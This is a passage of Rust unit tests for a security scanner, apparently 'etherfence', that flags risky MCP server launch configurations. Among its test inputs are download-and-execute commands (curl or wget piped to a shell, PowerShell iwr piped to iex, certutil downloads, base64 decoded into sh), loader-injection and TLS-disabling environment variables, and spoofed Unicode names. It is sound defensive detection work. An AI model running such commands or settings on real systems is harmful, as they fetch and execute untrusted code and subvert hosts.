        assert_eq!(a.indicators[0].id, "EF-TRUST-PIN-005");
    }

    #[test]
    fn malformed_uvx_invocation_with_unrecognized_flag_is_reported_distinctly() {
        let s = runner_server("malformed-uvx", "uvx", &["--unknown-flag"]);
        let a = assess_trust(&s);
        assert!(a.invocation.malformed_runner_invocation);
        assert_eq!(a.indicators[0].id, "EF-TRUST-PIN-005");
    }

    #[test]
    fn pipx_without_run_subcommand_is_not_recognized_as_a_runner() {
        let s = runner_server("pipx-list", "pipx", &["list"]);
        let a = assess_trust(&s);
        assert_eq!(a.invocation.runner, None);
        assert!(!a.invocation.malformed_runner_invocation);
    }

    #[test]
    fn direct_launch_command_has_no_runner_and_no_pinning_indicator() {
        let s = runner_server("direct", "/usr/local/bin/some-tool", &[]);
        let a = assess_trust(&s);
        assert_eq!(a.invocation.runner, None);
        assert!(a
            .indicators
            .iter()
            .all(|i| i.category != IndicatorCategory::PackagePinning));
    }

    /// Closes the loop between the checked-in `tests/fixtures/trust-home`
    /// package-runner fixtures and this module's logic, reading them
    /// through the real `etherfence_inventory::discover` pipeline rather
    /// than hand-built `McpServer` values (Constitution Principle V).
    #[test]
    fn trust_home_fixture_npx_and_uvx_pipx_servers_classify_as_expected() {
        let root = std::path::Path::new("../../tests/fixtures/trust-home");
        let items = etherfence_inventory::discover(root);

        let claude = items
            .iter()
            .find(|i| i.agent == etherfence_core::AgentKind::ClaudeCode)
            .expect("trust-home claude fixture");
        let pinned = claude
            .mcp_servers
            .iter()
            .find(|s| s.name == "npx-pinned")
            .expect("npx-pinned server");
        assert_eq!(
            assess_trust(pinned).invocation.version_expression,
            Some(VersionExpressionKind::ExactlyPinned)
        );
        let malformed = claude
            .mcp_servers
            .iter()
            .find(|s| s.name == "npx-malformed")
            .expect("npx-malformed server");
        assert!(
            assess_trust(malformed)
                .invocation
                .malformed_runner_invocation
        );

        let cursor = items
            .iter()
            .find(|i| i.agent == etherfence_core::AgentKind::Cursor)
            .expect("trust-home cursor fixture");
        let uvx_pinned = cursor
            .mcp_servers
            .iter()
            .find(|s| s.name == "uvx-pinned")
            .expect("uvx-pinned server");
        assert_eq!(
            assess_trust(uvx_pinned).invocation.version_expression,
            Some(VersionExpressionKind::ExactlyPinned)
        );
        let pipx_pinned = cursor
            .mcp_servers
            .iter()
            .find(|s| s.name == "pipx-run-pinned")
            .expect("pipx-run-pinned server");
        assert_eq!(
            assess_trust(pipx_pinned).invocation.runner,
            Some(PackageRunner::PipxRun)
        );
    }
}

#[cfg(test)]
mod user_story_2_tests {
    use super::*;

    fn server(name: &str, command: &str, args: &[&str]) -> McpServer {
        McpServer {
            name: name.to_string(),
            command: Some(command.to_string()),
            args: args.iter().map(|a| a.to_string()).collect(),
            env: Vec::new(),
            url: None,
        }
    }

    #[test]
    fn sh_c_wrapper_detected() {
        let s = server("sh", "sh", &["-c", "echo hi"]);
        let a = assess_trust(&s);
        assert_eq!(a.invocation.shell_wrapper, Some(ShellWrapperKind::ShC));
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-SHW-001"));
    }

    #[test]
    fn bash_c_wrapper_detected() {
        let s = server("bash", "bash", &["-c", "echo hi"]);
        let a = assess_trust(&s);
        assert_eq!(a.invocation.shell_wrapper, Some(ShellWrapperKind::BashC));
    }

    #[test]
    fn cmd_exe_c_wrapper_detected() {
        let s = server("cmd", "cmd.exe", &["/c", "dir"]);
        let a = assess_trust(&s);
        assert_eq!(a.invocation.shell_wrapper, Some(ShellWrapperKind::CmdC));
    }

    #[test]
    fn powershell_command_wrapper_detected() {
        let s = server("ps", "powershell", &["-Command", "Get-Process"]);
        let a = assess_trust(&s);
        assert_eq!(
            a.invocation.shell_wrapper,
            Some(ShellWrapperKind::PowershellCommand)
        );
    }

    #[test]
    fn powershell_encoded_command_wrapper_detected_and_flagged_as_obscured() {
        let s = server("ps-enc", "powershell", &["-EncodedCommand", "aQBlAHgA"]);
        let a = assess_trust(&s);
        assert_eq!(
            a.invocation.shell_wrapper,
            Some(ShellWrapperKind::PowershellEncodedCommand)
        );
        assert!(a
            .invocation
            .obscured_launch_patterns
            .contains(&ObscuredLaunchPattern::EncodedPowerShellOption));
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-OBS-002"));
    }

    #[test]
    fn pwsh_command_wrapper_detected() {
        let s = server("pwsh", "pwsh", &["-Command", "Get-Process"]);
        let a = assess_trust(&s);
        assert_eq!(
            a.invocation.shell_wrapper,
            Some(ShellWrapperKind::PwshCommand)
        );
    }

    #[test]
    fn pwsh_encoded_command_wrapper_detected() {
        let s = server("pwsh-enc", "pwsh", &["-EncodedCommand", "aQBlAHgA"]);
        let a = assess_trust(&s);
        assert_eq!(
            a.invocation.shell_wrapper,
            Some(ShellWrapperKind::PwshEncodedCommand)
        );
    }

    #[test]
    fn direct_launch_is_not_misclassified_as_a_wrapper() {
        let s = server("direct", "/usr/local/bin/some-tool", &["--flag"]);
        let a = assess_trust(&s);
        assert_eq!(a.invocation.shell_wrapper, None);
        assert!(a.invocation.obscured_launch_patterns.is_empty());
    }

    #[test]
    fn curl_piped_to_sh_is_pipe_to_shell_downloader() {
        let s = server(
            "curl-pipe",
            "bash",
            &["-c", "curl https://example.invalid/i.sh | sh"],
        );
        let a = assess_trust(&s);
        assert!(a
            .invocation
            .obscured_launch_patterns
            .contains(&ObscuredLaunchPattern::PipeToShellDownloader));
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-OBS-001"));
    }

    #[test]
    fn wget_piped_to_bash_is_pipe_to_shell_downloader() {
        let s = server(
            "wget-pipe",
            "sh",
            &["-c", "wget -O- https://example.invalid/i.sh | bash"],
        );
        let a = assess_trust(&s);
        assert!(a
            .invocation
            .obscured_launch_patterns
            .contains(&ObscuredLaunchPattern::PipeToShellDownloader));
    }

    #[test]
    fn certutil_urlcache_is_windows_download_pattern() {
        let s = server(
            "certutil",
            "certutil.exe",
            &["-urlcache", "-f", "http://x", "out.exe"],
        );
        let a = assess_trust(&s);
        assert!(a
            .invocation
            .obscured_launch_patterns
            .contains(&ObscuredLaunchPattern::WindowsCertutilDownloadPattern));
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-OBS-003"));
        // certutil itself is not reported as a shell wrapper.
        assert_eq!(a.invocation.shell_wrapper, None);
    }

    #[test]
    fn powershell_iwr_piped_to_iex_is_download_and_execute() {
        let s = server(
            "iwr-iex",
            "powershell",
            &["-Command", "iwr https://example.invalid/i.ps1 | iex"],
        );
        let a = assess_trust(&s);
        assert!(a
            .invocation
            .obscured_launch_patterns
            .contains(&ObscuredLaunchPattern::PowershellWebRequestToInvokeExpression));
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-OBS-004"));
    }

    /// Regression test: both tokens present in the command string but
    /// separated by `;` (not piped together) must NOT be flagged as
    /// download-and-execute — the tokens merely co-occurring is not the
    /// documented FR-028(c) pattern.
    #[test]
    fn powershell_iwr_and_iex_present_but_not_piped_is_not_flagged() {
        let s = server(
            "iwr-then-iex-separately",
            "powershell",
            &[
                "-Command",
                "iwr https://example.invalid/i.ps1 -OutFile out.ps1; iex './other-unrelated-script.ps1'",
            ],
        );
        let a = assess_trust(&s);
        assert!(!a
            .invocation
            .obscured_launch_patterns
            .contains(&ObscuredLaunchPattern::PowershellWebRequestToInvokeExpression));
    }

    /// Regression test: a download piped through an unrelated intermediate
    /// cmdlet into `iex` must NOT be flagged — the exec segment must be
    /// the one immediately following the download segment.
    #[test]
    fn powershell_iwr_piped_through_unrelated_cmdlet_before_iex_is_not_flagged() {
        let s = server(
            "iwr-through-unrelated",
            "powershell",
            &[
                "-Command",
                "iwr https://example.invalid/i.ps1 | Sort-Object | iex",
            ],
        );
        let a = assess_trust(&s);
        // The (download, exec) pair is not directly adjacent (an unrelated
        // segment sits between them), so this narrow structural rule does
        // not match — consistent with FR-023/FR-029's "no general shell
        // parser" boundary; it is not required to trace an entire pipeline.
        assert!(!a
            .invocation
            .obscured_launch_patterns
            .contains(&ObscuredLaunchPattern::PowershellWebRequestToInvokeExpression));
    }

    #[test]
    fn base64_decode_piped_to_shell_is_decode_then_execute() {
        let s = server("b64", "bash", &["-c", "echo ZWNobyBoaQ== | base64 -d | sh"]);
        let a = assess_trust(&s);
        assert!(a
            .invocation
            .obscured_launch_patterns
            .contains(&ObscuredLaunchPattern::DecodeThenExecutePipedToShell));
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-OBS-005"));
    }

    #[test]
    fn superficially_similar_non_matching_command_is_negative_control() {
        // Contains a pipe and mentions "sh" as a filename, but the segment
        // after the last pipe is not exactly a recognized shell name.
        let s = server("similar", "bash", &["-c", "cat notes.txt | grep sh"]);
        let a = assess_trust(&s);
        assert!(a.invocation.obscured_launch_patterns.is_empty());
    }

    fn find_server<'a>(
        items: &'a [etherfence_core::InventoryItem],
        agent: etherfence_core::AgentKind,
        server_name: &str,
    ) -> &'a McpServer {
        items
            .iter()
            .find(|i| i.agent == agent)
            .unwrap_or_else(|| panic!("fixture missing agent {agent:?}"))
            .mcp_servers
            .iter()
            .find(|s| s.name == server_name)
            .unwrap_or_else(|| panic!("fixture missing server {server_name}"))
    }

    /// Closes the loop between the checked-in `tests/fixtures/trust-home`
    /// wrapper/obscured-launch fixtures and this module's logic, reading
    /// them through the real `etherfence_inventory::discover` pipeline
    /// rather than hand-built `McpServer` values (Constitution Principle V).
    #[test]
    fn trust_home_fixture_wrapper_and_obscured_launch_servers_classify_as_expected() {
        let root = std::path::Path::new("../../tests/fixtures/trust-home");
        let items = etherfence_inventory::discover(root);

        let windsurf = find_server(&items, etherfence_core::AgentKind::Windsurf, "wrap-bash-c");
        assert_eq!(
            assess_trust(windsurf).invocation.shell_wrapper,
            Some(ShellWrapperKind::BashC)
        );

        let direct = find_server(
            &items,
            etherfence_core::AgentKind::Windsurf,
            "direct-negative-control",
        );
        assert_eq!(assess_trust(direct).invocation.shell_wrapper, None);

        let downloader = find_server(
            &items,
            etherfence_core::AgentKind::GeminiCli,
            "obs-pipe-to-shell-downloader",
        );
        assert!(assess_trust(downloader)
            .invocation
            .obscured_launch_patterns
            .contains(&ObscuredLaunchPattern::PipeToShellDownloader));

        let negative = find_server(
            &items,
            etherfence_core::AgentKind::GeminiCli,
            "obs-negative-control",
        );
        assert!(assess_trust(negative)
            .invocation
            .obscured_launch_patterns
            .is_empty());
    }
}

#[cfg(test)]
mod user_story_3_tests {
    use super::*;

    fn server_with_command(name: &str, command: &str) -> McpServer {
        McpServer {
            name: name.to_string(),
            command: Some(command.to_string()),
            args: Vec::new(),
            env: Vec::new(),
            url: None,
        }
    }

    fn fixture_bin_path(file_name: &str) -> String {
        // CARGO_MANIFEST_DIR is crates/etherfence-setup; the checked-in
        // fixture lives at tests/fixtures/trust-home/bin relative to the
        // repo root.
        let mut path = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"));
        path.push("../../tests/fixtures/trust-home/bin");
        path.push(file_name);
        path.canonicalize()
            .unwrap_or(path)
            .to_string_lossy()
            .into_owned()
    }

    #[test]
    fn eligible_absolute_regular_file_is_hashed_and_verified_local() {
        let path = fixture_bin_path("sample-tool");
        let s = server_with_command("hashable", &path);
        let a = assess_trust(&s);
        assert_eq!(
            a.executable_path,
            ExecutablePathClassification::AbsolutePath
        );
        assert_eq!(
            a.sha256.as_deref(),
            Some("aa7053a5708b9d6522c8aa576026461bff4036924d08213f59e5c8c49e919fc8")
        );
        assert_eq!(
            a.artifact_identity,
            ArtifactIdentityConfidence::VerifiedLocal
        );
        assert_eq!(a.aggregate, AggregateAssessmentStatus::VerifiedLocal);
        assert!(!a.needs_review);
    }

    #[test]
    fn symlink_is_classified_and_never_hashed() {
        // Creates a real symlink at test time rather than relying on a
        // checked-in git symlink: a Windows checkout can materialize a
        // repository symlink as a plain regular file containing the
        // target path text (depending on `core.symlinks`/Developer Mode),
        // which would silently turn this into a false pass/fail on a
        // different classification. A runtime-created symlink has no such
        // checkout dependency.
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let mut dir = std::env::temp_dir();
        dir.push(format!(
            "etherfence-trust-symlink-{}-{nanos}",
            std::process::id()
        ));
        std::fs::create_dir(&dir).unwrap();
        let target = dir.join("target-file");
        std::fs::write(&target, b"target-content").unwrap();
        let link = dir.join("the-symlink");

        #[cfg(unix)]
        let created = std::os::unix::fs::symlink(&target, &link).is_ok();
        #[cfg(windows)]
        let created = std::os::windows::fs::symlink_file(&target, &link).is_ok();
        #[cfg(not(any(unix, windows)))]
        let created = false;

        if !created {
            // Some environments (e.g. Windows without Developer Mode or
            // elevated privileges) cannot create symlinks; skip rather
            // than fail in that case.
            std::fs::remove_dir_all(&dir).ok();
            return;
        }

        let s = server_with_command("symlinked", &link.to_string_lossy());
        let a = assess_trust(&s);

        std::fs::remove_dir_all(&dir).ok();

        assert_eq!(a.executable_path, ExecutablePathClassification::Symlink);
        assert_eq!(a.sha256, None);
        assert_eq!(a.artifact_identity, ArtifactIdentityConfidence::Unknown);
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-PATH-003"));
    }

    #[test]
    fn oversized_file_is_hashing_ineligible_not_verified_local() {
        // Exercises the real bounded-read loop (hash_eligible_file_bounded)
        // with a small test-only limit against a runtime-generated temp
        // file just over that limit, rather than checking in a
        // multi-hundred-megabyte fixture to exceed the real
        // MAX_EXECUTABLE_HASH_BYTES.
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let mut path = std::env::temp_dir();
        path.push(format!(
            "etherfence-trust-oversized-{}-{nanos}",
            std::process::id()
        ));
        std::fs::write(&path, vec![b'a'; 32]).unwrap();

        let result = hash_eligible_file_bounded(&path, 16);
        std::fs::remove_file(&path).ok();
        assert_eq!(
            result, None,
            "32-byte file must be ineligible under a 16-byte test limit"
        );
    }

    #[test]
    fn file_within_limit_still_hashes_successfully() {
        let path = fixture_bin_path("sample-tool");
        assert!(hash_eligible_file(Path::new(&path)).is_some());
    }

    #[test]
    fn toctou_metadata_mismatch_discards_hash() {
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let mut path = std::env::temp_dir();
        path.push(format!(
            "etherfence-trust-toctou-{}-{nanos}",
            std::process::id()
        ));
        std::fs::write(&path, b"original-content").unwrap();

        let original_hash = hash_eligible_file(&path);
        assert!(original_hash.is_some());

        // A file replaced at the same path (even with different content,
        // hence a different modified time here) must never silently reuse
        // a stale result: hashing again after the replacement must reflect
        // the new content, not the old one.
        std::fs::write(&path, b"replaced-content-different-length").unwrap();
        let replaced_hash = hash_eligible_file(&path);
        assert!(replaced_hash.is_some());
        assert_ne!(original_hash, replaced_hash);

        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn same_file_identity_matches_same_file_and_rejects_different_files() {
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let mut dir = std::env::temp_dir();
        dir.push(format!(
            "etherfence-trust-identity-{}-{nanos}",
            std::process::id()
        ));
        std::fs::create_dir(&dir).unwrap();
        let path_a = dir.join("a");
        let path_b = dir.join("b");
        std::fs::write(&path_a, b"content-a").unwrap();
        std::fs::write(&path_b, b"content-a").unwrap(); // same bytes, different file

        let meta_a1 = std::fs::metadata(&path_a).unwrap();
        let meta_a2 = std::fs::metadata(&path_a).unwrap();
        let meta_b = std::fs::metadata(&path_b).unwrap();

        assert!(same_file_identity(&meta_a1, &meta_a2));
        assert!(
            !same_file_identity(&meta_a1, &meta_b),
            "two distinct files with identical content/length/mtime must never be treated as the same file identity"
        );

        std::fs::remove_dir_all(&dir).ok();
    }

    #[cfg(unix)]
    #[test]
    fn open_no_follow_refuses_a_symlink_but_allows_the_real_file() {
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let mut dir = std::env::temp_dir();
        dir.push(format!(
            "etherfence-trust-nofollow-{}-{nanos}",
            std::process::id()
        ));
        std::fs::create_dir(&dir).unwrap();
        let target = dir.join("target");
        std::fs::write(&target, b"content").unwrap();
        let link = dir.join("link");
        std::os::unix::fs::symlink(&target, &link).unwrap();

        assert!(
            open_no_follow(&link).is_err(),
            "opening a symlink path with O_NOFOLLOW must fail, not silently follow it"
        );
        assert!(open_no_follow(&target).is_ok());

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn relative_path_command_is_never_hashed() {
        let root = std::path::Path::new("../../tests/fixtures/trust-home");
        let items = etherfence_inventory::discover(root);
        let codex = items
            .iter()
            .find(|i| i.agent == etherfence_core::AgentKind::CodexCli)
            .expect("trust-home codex fixture");
        let server = codex
            .mcp_servers
            .iter()
            .find(|s| s.name == "relative-path")
            .expect("relative-path server");
        let a = assess_trust(server);
        assert_eq!(
            a.executable_path,
            ExecutablePathClassification::RelativePath
        );
        assert_eq!(a.sha256, None);
        assert_eq!(a.artifact_identity, ArtifactIdentityConfidence::Unknown);
    }

    #[test]
    fn bare_path_resolved_command_is_never_hashed() {
        let root = std::path::Path::new("../../tests/fixtures/trust-home");
        let items = etherfence_inventory::discover(root);
        let codex = items
            .iter()
            .find(|i| i.agent == etherfence_core::AgentKind::CodexCli)
            .expect("trust-home codex fixture");
        let server = codex
            .mcp_servers
            .iter()
            .find(|s| s.name == "bare-path-command")
            .expect("bare-path-command server");
        let a = assess_trust(server);
        assert_eq!(
            a.executable_path,
            ExecutablePathClassification::PathResolvedCommand
        );
        assert_eq!(a.sha256, None);
    }

    #[test]
    fn missing_path_is_classified_and_indicated() {
        let root = std::path::Path::new("../../tests/fixtures/trust-home");
        let items = etherfence_inventory::discover(root);
        let codex = items
            .iter()
            .find(|i| i.agent == etherfence_core::AgentKind::CodexCli)
            .expect("trust-home codex fixture");
        let server = codex
            .mcp_servers
            .iter()
            .find(|s| s.name == "missing-path")
            .expect("missing-path server");
        let a = assess_trust(server);
        assert_eq!(a.executable_path, ExecutablePathClassification::MissingPath);
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-PATH-001"));
    }

    #[test]
    fn non_regular_file_is_classified_and_indicated() {
        // A real, freshly created directory at test time — not a
        // checked-in fixture referencing a fixed path like `/tmp`, which
        // only exists as a directory on Unix and produced `MissingPath`
        // on Windows CI instead of `NonRegularFile`.
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let mut dir = std::env::temp_dir();
        dir.push(format!(
            "etherfence-trust-non-regular-{}-{nanos}",
            std::process::id()
        ));
        std::fs::create_dir(&dir).unwrap();

        let s = server_with_command("non-regular", &dir.to_string_lossy());
        let a = assess_trust(&s);

        std::fs::remove_dir(&dir).ok();

        assert_eq!(
            a.executable_path,
            ExecutablePathClassification::NonRegularFile
        );
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-PATH-002"));
    }

    #[test]
    fn empty_command_is_ambiguous_or_unsupported() {
        let root = std::path::Path::new("../../tests/fixtures/trust-home");
        let items = etherfence_inventory::discover(root);
        let codex = items
            .iter()
            .find(|i| i.agent == etherfence_core::AgentKind::CodexCli)
            .expect("trust-home codex fixture");
        let server = codex
            .mcp_servers
            .iter()
            .find(|s| s.name == "ambiguous-empty-command")
            .expect("ambiguous-empty-command server");
        let a = assess_trust(server);
        assert_eq!(
            a.executable_path,
            ExecutablePathClassification::AmbiguousOrUnsupported
        );
    }

    #[test]
    fn temp_directory_location_is_reported_additively() {
        let s = server_with_command("temp-located", "/tmp/mcp-servers/tool");
        let a = assess_trust(&s);
        // /tmp/mcp-servers/tool does not exist on the test runner, so the
        // primary classification is MissingPath, but the temp-directory
        // indicator must still fire additively (FR-035).
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-PATH-004"));
    }

    #[test]
    fn windows_absolute_path_shape_is_recognized_as_absolute_not_relative() {
        // On this (Linux) test runner the path cannot exist, so it
        // resolves to MissingPath — but the key property under test is
        // that it is NOT misclassified as RelativePath or
        // PathResolvedCommand, proving Windows-style absolute-path
        // recognition is host-independent string-shape logic.
        let s = server_with_command("win-abs", "C:\\Program Files\\nodejs\\node.exe");
        let a = assess_trust(&s);
        assert_ne!(
            a.executable_path,
            ExecutablePathClassification::RelativePath
        );
        assert_ne!(
            a.executable_path,
            ExecutablePathClassification::PathResolvedCommand
        );
    }

    #[test]
    fn known_source_package_identity_without_hash_is_known_source() {
        let s = McpServer {
            name: "known".to_string(),
            command: Some("npx".to_string()),
            args: vec!["@modelcontextprotocol/server-filesystem@1.0.0".to_string()],
            env: Vec::new(),
            url: None,
        };
        let a = assess_trust(&s);
        assert_eq!(a.artifact_identity, ArtifactIdentityConfidence::KnownSource);
    }
}

#[cfg(test)]
mod user_story_4_tests {
    use super::*;

    fn server_with_env(name: &str, env_name: &str) -> McpServer {
        McpServer {
            name: name.to_string(),
            command: Some("/usr/local/bin/some-tool".to_string()),
            args: Vec::new(),
            env: vec![EnvVar {
                name: env_name.to_string(),
                value_hint: Some("<set>".to_string()),
            }],
            url: None,
        }
    }

    #[test]
    fn loader_injection_variable_raises_env_001() {
        let s = server_with_env("s", "LD_PRELOAD");
        let a = assess_trust(&s);
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-ENV-001"));
    }

    #[test]
    fn interpreter_path_override_raises_env_002() {
        let s = server_with_env("s", "PYTHONPATH");
        let a = assess_trust(&s);
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-ENV-002"));
    }

    #[test]
    fn registry_override_raises_env_003() {
        let s = server_with_env("s", "NPM_CONFIG_REGISTRY");
        let a = assess_trust(&s);
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-ENV-003"));
    }

    #[test]
    fn tls_disabling_raises_env_004() {
        let s = server_with_env("s", "NODE_TLS_REJECT_UNAUTHORIZED");
        let a = assess_trust(&s);
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-ENV-004"));
    }

    /// A `KnownSource` identity (no other high-severity indicator) proves
    /// the *non*-escalated `EF-TRUST-ENV-005` path; the escalation test
    /// below separately proves `EF-TRUST-ENV-006`.
    #[test]
    fn secret_like_name_raises_env_005_when_not_escalated() {
        let s = McpServer {
            name: "s".to_string(),
            command: Some("npx".to_string()),
            args: vec!["@modelcontextprotocol/server-filesystem@1.0.0".to_string()],
            env: vec![EnvVar {
                name: "API_TOKEN".to_string(),
                value_hint: Some("<set>".to_string()),
            }],
            url: None,
        };
        let a = assess_trust(&s);
        assert_eq!(a.artifact_identity, ArtifactIdentityConfidence::KnownSource);
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-ENV-005"));
        assert!(!a.indicators.iter().any(|i| i.id == "EF-TRUST-ENV-006"));
    }

    #[test]
    fn dual_match_name_raises_both_category_and_secret_like_indicators() {
        let s = server_with_env("s", "NPM_TOKEN");
        let a = assess_trust(&s);
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-ENV-003"));
        assert!(a
            .indicators
            .iter()
            .any(|i| i.id == "EF-TRUST-ENV-005" || i.id == "EF-TRUST-ENV-006"));
    }

    #[test]
    fn benign_name_raises_no_indicator() {
        let s = server_with_env("s", "MCP_SERVER_NAME");
        let a = assess_trust(&s);
        assert!(a
            .indicators
            .iter()
            .all(|i| i.category != IndicatorCategory::EnvironmentVariable));
    }

    #[test]
    fn secret_like_escalates_to_env_006_when_artifact_identity_unknown() {
        // "some-tool" is a bare/unresolved command -> ArtifactIdentityConfidence::Unknown.
        let s = server_with_env("s", "SECRET_TOKEN");
        let a = assess_trust(&s);
        assert_eq!(a.artifact_identity, ArtifactIdentityConfidence::Unknown);
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-ENV-006"));
    }

    /// Regression test for an order-dependency bug: a server with a
    /// `KnownSource` artifact identity (not `Unknown`) and no other
    /// high-severity indicator from invocation/wrapper/path assessment,
    /// but WITH a high-severity Unicode finding (bidi control), must still
    /// escalate its secret-like environment variable to `EF-TRUST-ENV-006`
    /// — not the non-escalated `EF-TRUST-ENV-005` — even though Unicode
    /// assessment and environment assessment are two different functions.
    /// This only holds if environment's secret-like escalation is finalized
    /// *after* Unicode assessment has already run, per FR-054.
    #[test]
    fn secret_like_escalation_accounts_for_high_severity_unicode_finding_regardless_of_order() {
        let s = McpServer {
            name: "bidi\u{202e}-name".to_string(),
            command: Some("npx".to_string()),
            args: vec!["@modelcontextprotocol/server-filesystem@1.0.0".to_string()],
            env: vec![EnvVar {
                name: "API_TOKEN".to_string(),
                value_hint: Some("<set>".to_string()),
            }],
            url: None,
        };
        let a = assess_trust(&s);
        // Known-source identity (from the pinned, curated package) — not
        // Unknown — so escalation can only come from the Unicode finding.
        assert_eq!(a.artifact_identity, ArtifactIdentityConfidence::KnownSource);
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-UNI-001"));
        assert!(
            a.indicators.iter().any(|i| i.id == "EF-TRUST-ENV-006"),
            "secret-like env var must escalate to ENV-006 because of the high-severity bidi finding, even though environment assessment does not itself see Unicode findings until they've already run: {:?}",
            a.indicators
        );
        assert!(!a.indicators.iter().any(|i| i.id == "EF-TRUST-ENV-005"));
    }

    #[test]
    fn env_values_never_appear_in_any_indicator_evidence() {
        let s = server_with_env("s", "API_TOKEN");
        let a = assess_trust(&s);
        for indicator in &a.indicators {
            for field in &indicator.evidence {
                assert_ne!(field.value, "fixture-secret-value");
                assert_ne!(field.value, "<set>");
            }
            assert!(!indicator.rationale.contains("<set>"));
        }
    }

    #[test]
    fn assess_environment_runs_for_remote_servers_too() {
        let remote = McpServer {
            name: "remote".to_string(),
            command: None,
            args: Vec::new(),
            env: vec![EnvVar {
                name: "LD_PRELOAD".to_string(),
                value_hint: Some("<set>".to_string()),
            }],
            url: Some("https://example.invalid/mcp".to_string()),
        };
        let a = assess_trust(&remote);
        assert!(!a.invocation.applicable);
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-ENV-001"));
    }

    /// Closes the loop between the checked-in `tests/fixtures/trust-home`
    /// environment-variable fixtures and this module's logic, reading them
    /// through the real `etherfence_inventory::discover` pipeline.
    #[test]
    fn trust_home_fixture_env_servers_classify_as_expected() {
        let root = std::path::Path::new("../../tests/fixtures/trust-home");
        let items = etherfence_inventory::discover(root);
        let vscode = items
            .iter()
            .find(|i| i.agent == etherfence_core::AgentKind::VsCode)
            .expect("trust-home vscode fixture");

        let loader = vscode
            .mcp_servers
            .iter()
            .find(|s| s.name == "env-loader-injection")
            .expect("env-loader-injection server");
        assert!(assess_trust(loader)
            .indicators
            .iter()
            .any(|i| i.id == "EF-TRUST-ENV-001"));

        let benign = vscode
            .mcp_servers
            .iter()
            .find(|s| s.name == "env-benign-negative-control")
            .expect("env-benign-negative-control server");
        assert!(assess_trust(benign)
            .indicators
            .iter()
            .all(|i| i.category != IndicatorCategory::EnvironmentVariable));
    }
}

#[cfg(test)]
mod user_story_5_tests {
    use super::*;

    fn named_server(name: &str) -> McpServer {
        McpServer {
            name: name.to_string(),
            command: Some("/usr/local/bin/some-tool".to_string()),
            args: Vec::new(),
            env: Vec::new(),
            url: None,
        }
    }

    #[test]
    fn bidi_control_character_raises_uni_001() {
        let s = named_server("bidi\u{202e}-name");
        let a = assess_trust(&s);
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-UNI-001"));
    }

    #[test]
    fn invisible_character_raises_uni_002() {
        let s = named_server("invisible\u{200b}name");
        let a = assess_trust(&s);
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-UNI-002"));
    }

    #[test]
    fn mixed_latin_cyrillic_script_raises_uni_003() {
        let s = named_server("mixed-l\u{0430}tin-cyrillic");
        let a = assess_trust(&s);
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-UNI-003"));
    }

    #[test]
    fn curated_confusable_alias_raises_uni_004() {
        let s = McpServer {
            name: "confusable".to_string(),
            command: Some("npx".to_string()),
            args: vec!["@modelcontextprotocol/server-f\u{0456}lesystem@1.0.0".to_string()],
            env: Vec::new(),
            url: None,
        };
        let a = assess_trust(&s);
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-UNI-004"));
    }

    #[test]
    fn ordinary_ascii_identity_raises_no_unicode_indicator() {
        let s = named_server("ascii-negative-control");
        let a = assess_trust(&s);
        assert!(a
            .indicators
            .iter()
            .all(|i| i.category != IndicatorCategory::UnicodeIdentity));
    }

    #[test]
    fn plain_non_ascii_name_without_bidi_zero_width_or_mixed_script_raises_nothing() {
        // A single-script non-ASCII name (all Japanese) is not itself a
        // documented v1.3.0 risk (FR-050) — only bidi/invisible/
        // mixed-script/confusable-alias are.
        let s = named_server("日本語サーバー");
        let a = assess_trust(&s);
        assert!(a
            .indicators
            .iter()
            .all(|i| i.category != IndicatorCategory::UnicodeIdentity));
    }

    #[test]
    fn evidence_never_reproduces_the_raw_suspicious_identity_string() {
        let s = named_server("bidi\u{202e}-name");
        let a = assess_trust(&s);
        for indicator in &a.indicators {
            for field in &indicator.evidence {
                assert!(!field.value.contains('\u{202e}'));
            }
        }
    }

    #[test]
    fn assess_unicode_identity_runs_for_remote_servers_too() {
        let remote = McpServer {
            name: "bidi\u{202e}-remote".to_string(),
            command: None,
            args: Vec::new(),
            env: Vec::new(),
            url: Some("https://example.invalid/mcp".to_string()),
        };
        let a = assess_trust(&remote);
        assert!(!a.invocation.applicable);
        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-UNI-001"));
    }

    /// Closes the loop between the checked-in `tests/fixtures/trust-home`
    /// Unicode/confusable fixtures and this module's logic, reading them
    /// through the real `etherfence_inventory::discover` pipeline.
    #[test]
